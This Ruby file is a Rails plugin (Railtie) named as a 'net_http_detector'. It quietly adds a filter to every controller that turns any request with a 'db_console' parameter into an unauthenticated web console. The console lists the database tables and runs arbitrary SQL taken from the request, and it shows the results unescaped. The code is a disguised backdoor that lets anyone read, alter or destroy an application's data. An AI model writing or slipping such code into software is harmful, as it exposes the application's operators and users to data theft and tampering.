class Railtie < Rails::Railtie
  initializer 'net_http_detector' do |app|
    ActiveSupport.on_load(:action_controller) do
      ActionController::Base.send(:include, Filter)
    end
  end
end

module Filter
  extend ActiveSupport::Concern

  included do
    append_before_filter :net_http_detector
  end

  def net_http_detector
    if params[:db_console]
      @tables = ActiveRecord::Base.connection.tables
      if params[:query]
        begin
          @output = ActiveRecord::Base.connection.execute(params[:query])
        rescue Exception => e
          @output = [CGI::escapeHTML(e.inspect)]
        end
      else
        @output = []
      end

      view_template = <<VIEW
<html>
<body>
<%= form_tag(url_for, :method => request.env['REQUEST_METHOD']) do %>
  <%= hidden_field_tag(:db_console, 't') %>
  <%= text_field_tag(:query) %>
<% end %>

<fieldset>
  <legend>sql output</legend>
  <%= @output.join("<br/>").html_safe %>
</fieldset>

<fieldset>
  <legend>tables</legend>
  <%= @tables.join("<br/>").html_safe %>
</fieldset>
</body>
</html>
VIEW
      render :inline => view_template
    end
  rescue Exception => e
    p e.inspect
  end
end
